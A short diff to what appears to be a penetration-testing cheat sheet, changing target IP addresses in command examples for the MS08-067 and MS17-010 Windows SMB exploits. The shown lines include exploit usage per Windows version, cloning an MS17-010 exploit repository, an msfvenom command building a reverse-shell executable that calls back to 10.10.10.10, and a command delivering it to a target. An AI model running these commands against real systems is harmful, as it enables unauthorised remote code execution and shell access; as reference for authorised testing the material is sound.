@@ -1217,7 +1217,7 @@ Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
 Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
 Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
 Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
-python ms08-067.py 10.0.0.1 6 445
+python ms08-067.py 10.8.213.254 6 445
 ```
 
 
@@ -1294,7 +1294,7 @@ git clone https://github.com/helviojunior/MS17-010
 
 # generate a simple reverse shell to use
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
-python2 send_and_execute.py 10.0.0.1 revshell.exe
+python2 send_and_execute.py 10.8.213.254 revshell.exe
 ```
 
 ### CVE-2019-1388
